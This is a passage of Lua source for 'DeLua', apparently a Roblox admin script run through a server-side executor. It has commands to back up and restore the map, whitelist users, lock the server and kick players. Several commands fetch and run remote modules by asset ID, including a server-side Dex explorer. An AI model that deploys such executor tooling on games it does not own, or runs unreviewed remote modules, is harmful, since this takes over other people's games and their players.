		end
	end
})




local Backups = DeLuaFolder:FindFirstChild("Backups")
if not Backups then
	Backups = Instance.new("Folder", DeLuaFolder)
	Backups.Name = "Backups"
end

addcmd({
	Name = "backup",
	Aliases = {"savebackup"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		local Backups = DeLuaFolder:FindFirstChild("Backups")
		if not Backups then
			Backups = Instance.new("Folder", DeLuaFolder)
			Backups.Name = "Backups"
		end

		local oldSavedMap = Backups:FindFirstChild("SavedMap")
		if oldSavedMap then
			oldSavedMap:Destroy()
		end
		local oldFailedToClone = Backups:FindFirstChild("FailedToClone")
		if oldFailedToClone then
			oldFailedToClone:Destroy()
		end

		task.wait(0.5)
		local SavedMap = Instance.new("Folder")
		SavedMap.Name = "SavedMap"
		SavedMap.Parent = Backups

		local FailedToClone = Instance.new("Folder")
		FailedToClone.Name = "FailedToClone"
		FailedToClone.Parent = Backups

		for _, obj in ipairs(workspace:GetChildren()) do
			if obj:IsA("Terrain") then
				EditConsoleResponse("Skipping Terrain", "Yellow")
			else
				local success, cloned = pcall(function()
					return obj:Clone()
				end)

				if success and cloned then
					cloned.Parent = SavedMap
					EditConsoleResponse("Cloned: " .. obj.Name, "Blue")
				else
					local reference = Instance.new("StringValue")
					reference.Name = obj.Name
					reference.Value = "Failed to clone: " .. obj.Name .. " (Class: " .. obj.ClassName .. ")"
					reference.Parent = FailedToClone
					EditConsoleResponse("Could not clone: " .. obj.Name .. ", added reference to FailedToClone", "Red")
				end
			end
		end

		local removedCount = 0
		for _, descendant in ipairs(SavedMap:GetDescendants()) do
			if descendant:IsA("Model") and descendant:FindFirstChild("Humanoid") and descendant:FindFirstChild("HumanoidRootPart") then
				descendant:Destroy()
				removedCount = removedCount + 1
				EditConsoleResponse("Removed player model from backup: " .. descendant.Name, "White")
			end
		end

		notif(sender, "DeLua", "Backup complete. Removed " .. removedCount .. " player models. Use " .. Initiate.Prefix .. "loadbackup to load it.", "Success")
	end
})


addcmd({
	Name = "loadbackup",
	Aliases = {"lb"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		local Backups = DeLuaFolder:FindFirstChild("Backups")
		if not Backups then
			notif(sender, "DeLua", "No backup found. Use " .. Initiate.Prefix .. "backup to create one.", "Error")
			return
		end

		local SavedMap = Backups:FindFirstChild("SavedMap")
		if not SavedMap then
			notif(sender, "DeLua", "No saved map found inside backup.", "Error")
			return
		end

		for _, obj in ipairs(workspace:GetChildren()) do
			if not obj:IsA("Terrain") and not (obj:IsA("Model") and obj:FindFirstChild("Humanoid") and obj:FindFirstChild("HumanoidRootPart")) then
				obj:Destroy()
			end
		end

		for _, obj in ipairs(SavedMap:GetChildren()) do
			local cloned = obj:Clone()
			cloned.Parent = workspace
			EditConsoleResponse("Loaded: " .. obj.Name, "Blue")
		end

		notif(sender, "DeLua", "Backup loaded successfully.", "Success")
	end
})


addcmd({
	Name = "define",
	Aliases = {"def"},
	Permission = 3,
	Function = function(sender, targets, arguments)
		for _, v in pairs(game.Players:GetPlayers()) do
			notif(v, "DeLua", Initiate.ExecutedBy.." is using DeLua Admin System", "Info", 10)
		end
	end
})

addcmd({
	Name = "announce",
	Aliases = {"anc", "message", "m"},
	Permission = 1,
	TargetRequired = false,
	Function = function(sender, targets, arguments)
		local AnnouncementModule = require(102940338198627)

		if #arguments < 2 then
			notif(sender, "Invalid", "-m [duration] [message]", "Warning", 10)
			return
		end

		local Duration = tonumber(arguments[1])
		if not Duration then
			notif(sender, "Invalid", "Invalid duration. Usage: -m [duration] [message]", "Warning", 10)
			return
		end

		local Message = table.concat(arguments, " ", 2)
		if Message == "" then
			notif(sender, "Invalid", "Invalid announcement. Usage: -m [duration] [message]", "Warning", 10)
			return
		end

		for _, v in pairs(game.Players:GetPlayers()) do
			task.spawn(function()
				AnnouncementModule:Announce(v, Message, Duration)
			end)
		end
	end
})


addcmd({
	Name = "f3x",
	Aliases = {"btools"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, err = pcall(function()
				require(2571067295).load(plr.Name)
			end)

			if err then
				notif(sender, "DeLua", "F3X failed to load: ".. err, "Error")
			end

		end
	end
})

addcmd({
	Name = "dex",
	Aliases = {},
	Permission = 2,
	Function = function(sender, targets, arguments)
		NotificationLibrary:ServerConfirm(sender, {
			Title = "DeLua",
			Text = "Dex SSS can affect the chat systems and stop messages, DeLua recommends Dex SS",
			YesText = "Dex SSS",
			NoText = "Dex SS",
			Duration = 10,
			OnYes = function(player)
				for i, plr in ipairs(targets) do

					local success, fail = pcall(function()
						require(107826504628867)(plr.Name) -- SSS
					end)

					if fail then
						notif(sender, "Dex SSS", "Failed to load: ".. fail, "Error")
					end
				end
			end,
			OnNo = function(player)
				for i, plr in ipairs(targets) do

					local success, fail = pcall(function()
						require(14572394952)(plr.Name) -- SS
					end)

					if fail then
						notif(sender, "Dex SS", "Failed to load: ".. fail, "Error")
					end
				end
			end
		})
	end
})



addcmd({
	Name = "vis",
	Aliases = {"visualizer"},
	Permission = 1,
	Function = function(sender, targets, arguments)
		EditConsoleResponse("Hold on setting up Visualizer Module...", "Info")
		task.wait(0.1)
		--
		require(113989885855166)(sender.Name)
		Initiate.VisualizerRan = true
	end
})

addcmd({
	Name = "play",
	Aliases = {"visualizerplay"},
	Permission = 1,
	TargetRequired = false,
	Function = function(sender, targets, arguments)
		if Initiate.VisualizerRan == false then
			notif(sender, "DeLua", "Visualizer module not found: run "..Initiate.Prefix.."vis", "Warning")
		else
			local ID = tonumber(table.concat(arguments))
			if not ID then
				notif(sender, "DeLua", "Invalid SoundId: Please provide a valid number", "Warning")
				return
			end

			local character = game.Workspace:FindFirstChild(sender.Name)
			if character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart:FindFirstChild("Sound") then
				local sound = character.HumanoidRootPart.Sound
				sound:Stop()
				sound.SoundId = "rbxassetid://" .. ID
				sound:Play()
				notif(sender, "DeLua", "New SoundId set to:", sound.SoundId, "Success")
			else
				notif(sender, "DeLua", "Sound object not found, has it been removed?", "Warning")
			end
		end
	end
})

addcmd({
	Name = "vol",
	Aliases = {"visualizervolume", "volume"},
	Permission = 1,
	TargetRequired = false,
	Function = function(sender, targets, arguments)
		if Initiate.VisualizerRan == false then
			notif(sender, "DeLua", "Visualizer module not found: run "..Initiate.Prefix.."vis", "Warning")
		else
			local Volume = tonumber(table.concat(arguments))
			if not Volume then
				notif(sender, "DeLua", "Invalid Volume: Provide a valid number", "Warning")
				return
			end

			local character = game.Workspace:FindFirstChild(sender.Name)
			if character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart:FindFirstChild("Sound") then
				local sound = character.HumanoidRootPart.Sound
				sound:Stop()
				sound.Volume = Volume
				sound:Play()
				notif(sender, "DeLua", "New Volume set to:", Volume, "Success")
			else
				notif(sender, "DeLua", "Sound object not found, has it been removed?", "Warning")
			end
		end
	end
})


--// Whitelist Command
addcmd({
	Name = "whitelist",
	Aliases = {"wl"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr == sender then
				notif(sender, "DeLua", "You cannot whitelist yourself.", "Warning")
			else
				NotificationLibrary:ServerConfirm(sender, {
					Title = "DeLua",
					Text = "Full access or semi-access?",
					YesText = "Full Access (Head Admin)",
					NoText = "Semi-Access (MOD)",
					Duration = 5,
					OnYes = function()
						Internals.Whitelisted[plr.Name] = 2
						notif(sender, "DeLua", "(Headadmin) Whitelisted: " .. plr.Name, "Success")
						notif(plr, "DeLua", "(Headadmin) Whitelisted", "Success")

					end,
					OnNo = function()
						Internals.Whitelisted[plr.Name] = 1
						notif(sender, "DeLua", "(Mod) Semi-Whitelisted: " .. plr.Name, "Success")
						notif(plr, "DeLua", "(Mod) Semi-Whitelisted", "Success")

					end
				})
			end
		end
	end
})


--// Unwhitelist Command
addcmd({
	Name = "unwhitelist",
	Aliases = {"unwl", "removewl"},
	Permission = 2,
	Function = function(sender, targets, arguments)
		for _, plr in ipairs(targets) do
			if plr.Name == Initiate.ExecutedBy then
				notif(sender, "DeLua", "You can not unwhitelist Lvl 3 Perms", "Warning")
			elseif Internals.Whitelisted[plr.Name] then
				Internals.Whitelisted[plr.Name] = nil
				notif(sender, "DeLua", "Removed from whitelist: " .. plr.Name, "Success")
			else
				notif(sender, "DeLua", plr.Name .. " is not whitelisted.", "Warning")
			end
		end
	end
})

addcmd({
	Name = "permcheck",
	Aliases = {"checkperm", "myperm"},
	Permission = 1,
	TargetRequired = false,
	Function = function(sender, targets, arguments)
		local level = Internals.Whitelisted[sender.Name]
		local msg

		if sender.Name == Initiate.ExecutedBy and level == nil then
			msg = "You are the Executor (Owner) - Permission Level 3"
		elseif level == 2 then
			msg = "You are Head Admin - Permission Level 2"
		elseif level == 1 then
			msg = "You are Semi-Whitelisted (MOD) - Permission Level 1"
		else
			msg = "You are not whitelisted"
		end

		notif(sender, "DeLua", msg, "Info")
	end
})



--// Process Command
local function processCommand(player, msg)
	if msg:sub(1, #Initiate.Prefix) == Initiate.Prefix then
		msg = msg:sub(#Initiate.Prefix + 1)
		local parts = msg:split(" ")
		local cmdname = parts[1]
		local command = Internals.Commands[cmdname]

		if not command then
			for _, cmd in pairs(Internals.Commands) do
				if table.find(cmd.Data.Aliases, cmdname) then
					command = cmd
					break
				end
			end
		end

		if command then
			if not hasPermission(player, command.Data.Permission) then
				local requiredLevel = command.Data.Permission or "?"
				notif(player, "DeLua", "You lack permission to use '" .. cmdname .. "' (Requires Lvl " .. requiredLevel .. ").", "Error")
				return
			end


			local targets, args

			if command.Data.TargetRequired then
				local targetArg = parts[2] or "me"
				args = {table.unpack(parts, 3)}
				targets = p(targetArg, player)
				command.Data.Function(player, targets, args)
			else
				args = {table.unpack(parts, 2)}
				command.Data.Function(player, nil, args)
			end
		else
			notif(player, "Error", "Command '" .. cmdname .. "' not found.", "Error")
		end
	end
end

--// Player Init
for _, v in pairs(game.Players:GetPlayers()) do
	v.Chatted:Connect(function(msg)
		if Initiate.ExecutedBy == v.Name or Internals.Whitelisted[v.Name] then
			processCommand(v, msg)
		end
	end)
end

--// Player Added
game.Players.PlayerAdded:Connect(function(player)
	if Internals.Whitelisted[player.Name] == player.Name or Initiate.ExecutedBy == player.Name then
		notif(player, "DeLua", "Welcome, Prefix: " .. Initiate.Prefix, "Info")
	end
	if Internals.Serverlock and player.Name ~= Initiate.ExecutedBy then
		player:Kick("DeLua: this server is locked, please join another.")
	end
	player.Chatted:Connect(function(msg)
		if Initiate.ExecutedBy == player.Name or Internals.Whitelisted[player.Name] then
			processCommand(player, msg)
		end
	end)
end)



notif(Initiate.User, "DeLua", "All ready for use!", "Success")


ConsoleResponse.Text = "DeLua is now ready to use ✅"
task.wait(2)
ConsoleResponse.Text = ""



NotificationLibrary:ServerConfirm(Initiate.User, {
	Title = "DeLua",
	Text = "Hey it's recommended that you backup the server right away!",
	YesText = "Confirm",
	NoText = "Cancel",
	Duration = 0,
	OnYes = function(player)
		local Backups = DeLuaFolder:FindFirstChild("Backups")
		if not Backups then
			Backups = Instance.new("Folder", DeLuaFolder)
			Backups.Name = "Backups"
		end

		local oldSavedMap = Backups:FindFirstChild("SavedMap")
		if oldSavedMap then
			oldSavedMap:Destroy()
		end
		local oldFailedToClone = Backups:FindFirstChild("FailedToClone")
		if oldFailedToClone then
			oldFailedToClone:Destroy()
		end

		task.wait(0.5)
		local SavedMap = Instance.new("Folder")
		SavedMap.Name = "SavedMap"
		SavedMap.Parent = Backups

		local FailedToClone = Instance.new("Folder")
		FailedToClone.Name = "FailedToClone"
		FailedToClone.Parent = Backups

		for _, obj in ipairs(workspace:GetChildren()) do
			if obj:IsA("Terrain") then
				EditConsoleResponse("Skipping Terrain", "Yellow")
			else
				local success, cloned = pcall(function()
					return obj:Clone()
				end)

				if success and cloned then
					cloned.Parent = SavedMap
					EditConsoleResponse("Cloned: " .. obj.Name, "Blue")
				else
					local reference = Instance.new("StringValue")
					reference.Name = obj.Name
					reference.Value = "Failed to clone: " .. obj.Name .. " (Class: " .. obj.ClassName .. ")"
					reference.Parent = FailedToClone
					EditConsoleResponse("Could not properly clone: " .. obj.Name .. ", added reference to FailedToClone", "Red")
				end
			end
		end

		local removedCount = 0
		for _, descendant in ipairs(SavedMap:GetDescendants()) do
			if descendant:IsA("Model") and descendant:FindFirstChild("Humanoid") and descendant:FindFirstChild("HumanoidRootPart") then
				descendant:Destroy()
				removedCount = removedCount + 1
				EditConsoleResponse("Removed player model from backup: " .. descendant.Name, "White")
			end
		end

		task.wait(1)
		EditConsoleResponse("Backup complete. Removed " .. removedCount .. " player models from backup. Use " .. Initiate.Prefix .. "loadbackup to load.", "Blue")
		task.wait(3)
		ConsoleResponse.Text = ""
	end,
	OnNo = function(player)
		notif(player, "DeLua", "Backup cancelled, you can back up later with "..Initiate.Prefix.."backup", "Success")
	end
})

